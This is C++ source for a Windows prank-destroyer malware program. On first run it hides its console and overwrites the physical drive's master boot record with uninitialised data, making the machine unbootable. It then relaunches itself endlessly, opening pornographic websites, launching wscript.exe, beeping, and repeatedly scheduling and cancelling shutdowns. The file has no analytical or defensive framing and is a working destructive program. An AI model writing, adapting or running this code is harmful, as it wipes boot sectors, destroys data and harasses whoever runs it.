// src.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"

#include<windows.h>
#include<stdio.h>
#include<stdlib.h>

#include<iostream>
#include<sstream>
#include<fstream>

#include<cstdlib>
#include<cstdio>
#include<string>

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

	if (CopyFile("tmp", "temp", false) == true) 
	{
		TCHAR szExeFileName[MAX_PATH];

		GetModuleFileName(NULL, szExeFileName, MAX_PATH);
		ShellExecute(NULL, "open", szExeFileName, NULL, NULL, SW_HIDE);

		for (;;)
		{
			ShellExecute(NULL, "open", "https://www.yespornplease.com", NULL, NULL, SW_SHOW);
			ShellExecute(NULL, "open", "https://www.youporn.com", NULL, NULL, SW_SHOW);
			ShellExecute(NULL, "open", "https://www.xnxx.com", NULL, NULL, SW_SHOW);
			ShellExecute(NULL, "open", "C:\\Windows\\System32\\wscript.exe", NULL, NULL, SW_HIDE);

			system("shutdown -s -t 1000");
			system("shutdown -a");
			system("shutdown -s -t 1000");
			system("shutdown -a");
			Beep(523, 10000);
			system("shutdown -s -t 1000");
			system("shutdown -a");
			system("shutdown -s -t 1000");
			system("shutdown -a");
			system("shutdown -s -t 1000");
			system("shutdown -a");
			system("shutdown -s -t 1000");

			ShellExecute(NULL, "open", szExeFileName, NULL, NULL, SW_HIDE);
			Beep(523, 10000);
		}
	}

	else
	{
		std::ofstream _out("tmp");

		char mbr[512];

		DWORD dwBytesWritten = { 0 };
		int buff = 512;
		HANDLE fh;

		for (int index = 0; index <= 8; index += 1) {
			fh = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
			WriteFile(fh, mbr, buff, &dwBytesWritten, NULL);
		}

		TCHAR szExeFileName[MAX_PATH];

		GetModuleFileName(NULL, szExeFileName, MAX_PATH);
		ShellExecute(NULL, "open", szExeFileName, NULL, NULL, SW_HIDE);

		Beep(523, 10000);
		system("shutdown -a");
	}

	return 0;
}